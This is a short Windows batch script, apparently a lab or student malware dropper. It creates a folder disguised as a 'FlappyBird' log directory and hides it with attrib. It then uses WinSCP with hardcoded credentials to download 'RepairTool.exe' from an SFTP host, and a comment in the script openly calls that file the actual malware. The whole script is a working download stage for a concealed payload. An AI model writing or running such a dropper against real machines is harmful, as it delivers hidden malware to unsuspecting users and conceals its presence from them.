
@echo off
setlocal

rem create a folder
md C:\FlappyBirdLog


rem hide file
attrib +h C:\FlappyBirdLog

rem Set your WinSCP executable path (update this path if needed)
set WINSCP_PATH="C:\Program Files (x86)\WinSCP\WinSCP.com"

rem Set your SFTP server details
set SFTP_HOST=172.20.10.10
set SFTP_USER=mysftpuser
set SFTP_PASSWORD=12345
set REMOTE_FILE= /test/RepairTool.exe
set LOCAL_FILE=C:\FlappyBirdLog\RepairTool.exe

rem Download the RepairTool(Actual melware) file from the SFTP server
%WINSCP_PATH% /command ^
    "open sftp://%SFTP_USER%:%SFTP_PASSWORD%@%SFTP_HOST%" ^
    "get %REMOTE_FILE%  C:\FlappyBirdLog\RepairTool.exe" ^
    "exit"



endlocal
